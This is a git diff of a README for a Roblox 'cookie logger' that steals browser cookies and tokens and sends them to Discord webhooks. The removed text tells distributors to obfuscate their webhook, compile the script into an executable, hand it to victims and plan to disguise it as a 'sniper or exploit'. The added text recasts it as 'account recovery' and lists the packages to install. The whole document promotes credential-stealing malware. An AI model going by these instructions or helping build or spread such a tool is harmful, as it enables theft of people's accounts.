@@ -1,14 +1,149 @@
-# Codename Cronic Cookie
-Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it. 
-# Capitan DualHook
-Release Capitan DualHook (Or CDH) has brought a new way of logging. You simply give out an already [compiled](https://nuitka.net/) version, leading to your webhook AND the persons webhook. Make sure to go on an alt and show them with proof that the logger works.
-# Short description
-This is a project i have made. It should work and i need some feedback. If it works, please open an issue and tell it to me because I am very unsure of my programming skills.
-# How To Use
-First of all, you will need to install the following pips: pip install requests, browser_cookie3 (if you dont know how just go to the folder with the files and type cmd in the navigation bar). Then you would like to get your webhooks and convert it into base32 (safer from crackers). Finally, you just paste it into the space where it says 'key = "PASTE THE HOOK HERE"' Then just compile with pyinstaller (I prefer [nuitka](https://nuitka.net/)) and kaboom. Good luck beamers!
-# Nuitka 4 Dummiez
--pip install nuitka
--python -m nuitka main.py
--Send with dll for it to work.
-# Plans 
-Idk i might update it. I am planning on making this look like a limited sniper or an exploit (idk just playing aroud)
+<!--
+*** hmmm
+-->
+
+
+
+
+
+<!-- PROJECT LOGO -->
+<br />
+<p align="center">
+  </a>
+   <img src="https://github.githubassets.com/images/mona-whisper.gif" alt="Logo" width="80" height="80">
+  </a>
+
+  <h3 align="center">CronicCookie</h3>
+
+  <p align="center">
+    Smooth and quick cookie logger for account recovery.
+    <br />
+    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger">View Demo</a>
+    ·
+    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Report Bug</a>
+    ·
+    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Request Feature</a>
+  </p>
+</p>
+
+
+
+<!-- TABLE OF CONTENTS -->
+<details open="open">
+  <summary><h2 style="display: inline-block">Table of Contents</h2></summary>
+  <ol>
+    <li>
+      <a href="#about-the-project">About The Project</a>
+      <ul>
+        <li><a href="#built-with">Built With</a></li>
+      </ul>
+    </li>
+    <li>
+      <a href="#getting-started">Getting Started</a>
+      <ul>
+        <li><a href="#prerequisites">Prerequisites</a></li>
+        <li><a href="#installation">Installation</a></li>
+      </ul>
+    </li>
+    <li><a href="#usage">Usage</a></li>
+    <li><a href="#roadmap">Roadmap</a></li>
+    <li><a href="#contributing">Contributing</a></li>
+    <li><a href="#license">License</a></li>
+    <li><a href="#contact">Contact</a></li>
+    <li><a href="#acknowledgements">Acknowledgements</a></li>
+  </ol>
+</details>
+
+
+
+<!-- ABOUT THE PROJECT -->
+## About The Project
+Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it.
+
+
+### Built With
+
+* [Python](https://python.org)
+
+
+
+<!-- GETTING STARTED -->
+## Getting Started
+
+To get a local copy up and running follow these simple steps.
+
+### Prerequisites
+
+This is an example of how to list things you need to use the software and how to install them.
+  ```
+  - Go to the folder with all of the files.
+  - In the navigation bar (C:/User/Desktop/Roblox-Cookie-Logger) delete everything and type cmd, this will bring up "the shell".
+  - Now install the packages as instructed.
+  ```
+
+### Installation
+
+1. Download the .zip of this repository
+   ```
+   git clone https://github.com/DaEpicSwag/Roblox-Cookie-Logger.git
+   ```
+2. Install PIP packages
+   ```
+   pip install nuitka
+   pip install requests
+   pip install browser_cookie3
+   pip install discord-webhook
+   ```
+
+
+
+<!-- USAGE EXAMPLES -->
+## Usage
+
+Use your 2 eyeballs and 4 braincells to read this document.
+
+
+
+<!-- ROADMAP -->
+## Roadmap
+
+See the [open issues](https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues) for a list of proposed features (and known issues).
+
+
+
+<!-- CONTRIBUTING -->
+## Contributing
+
+Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+
+1. Fork the Project
+2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the Branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+
+
+<!-- LICENSE -->
+## License
+
+Distributed under the MIT License. See `LICENSE` for more information.
+
+
+
+<!-- CONTACT -->
+## Contact
+
+Discord - **@SonicTheHedHog#0001**
+
+Project Link: [Roblox-Cookie-Logger](https://github.com/DaEpicSwag/Roblox-Cookie-Logger)
+
+
+
+<!-- ACKNOWLEDGEMENTS -->
+## Acknowledgements
+
+* [PogScriptR]() Thanks for the request webhook explaination
+
+
+
